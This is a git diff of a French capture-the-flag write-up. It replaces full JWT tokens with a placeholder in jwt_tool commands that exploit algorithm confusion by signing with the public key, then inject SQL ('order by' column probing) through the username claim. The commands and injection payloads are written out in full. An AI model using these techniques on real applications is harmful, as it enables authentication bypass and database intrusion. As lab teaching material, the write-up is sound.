@@ -122,7 +122,7 @@ Je vais donc décoder mon token (généré après inscription sur l'application 
 
 Il existe un outil qui permet d'exploiter un token [jwt](https://github.com/ticarpi/jwt_tool)
 ```bash
-python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InplbG9mYW5lIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNzE2MDU2MDkyfQ.vKcHvh8AR4bBZkwXWelX-GbHUGULk9T8t0wbuWR0wXjxTPE1uprN3_0K0qS7AFtNx1x1lLUPPeUBmMWKpJ5nrQ6nPvxWiB0lgf2B0xRZ_i1VJ5T6IL76tdEp-LhosW5iLUCHlqJawYFj2_wvgPwn-MQT-6aHajgXIo73u7jKL9kcRszUb75QgCZpRmY5Q7P78E3nD__0en_lsV4cTPneR4wSPYh3NhKbDkODY8zfSd42d108Vi0yLDqGMOY7Uli9z0r-kZSm5HSNbpVK5qi48qq2i2f6Rq0309gyS4vfBGkMb8eGvc9JZKKrE3WxWIG6AADwROo6PXQx00ZdKEPVCg -X k -pk ./pubkey.pem -I -pc username -pv dine
+python3 jwt_tool.py <jwt_token> -X k -pk ./pubkey.pem -I -pc username -pv dine
 
 ```
 * -X k : exploitation de confusion d'algorithme (permet de signer le token avec la clé publique)
@@ -158,8 +158,8 @@ Maintenant que nous pouvons interagir librement avec la base de données nous al
 ## injection sql
 ### Découverte du nombre de colonnes
 A la place de `dine` je vais mettre `zelofane' order by 2-- -` puis 3, 4 ainsi de suite jusqu'a avoir une erreur de type *out of range*.
-```
-python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRpbmUiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE3MTYwNjcwMjN9.mLkZFyrlJEPo_ZcRqY-PcPrpwv6pSs1zgrxlFI1mbRocvlnuGweSxForrgmE4jrOPVd150UsHVNEAi_CZOArwKV1_baFSk_vvDR2M0s9JEaT3p8MdVD0EkVNvppmH8SuiejcIjJGkNYraOcryBVt0-5r1n0O0VQ--NsbiyYFJq2bb_5QBAyGwgX4289P8Bqr-XPDgTK1vMB4yIrstBCvZBhzicHScnrVdgdSRWJJBDOLGKX87POoO0S7Sln7Fe9QaZaJ2Oo_XmeFdl-D0y3H4E0u7dnMyGkvtW59UqdlRS6v1AmbGDmarLSkysHAvdSKI4szwWL1pJZo02EeuqHO8w -X k -pk ./pubkey.pem -I -pc username -pv "zelofane' order by 4-- -"
+```bash
+python3 jwt_tool.py <jwt_token> -X k -pk ./pubkey.pem -I -pc username -pv "zelofane' order by 4-- -"
 ```
 ![Pasted image 20240518200546](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/f117dd2a-8284-41b4-8871-5602f5d72a16)
 
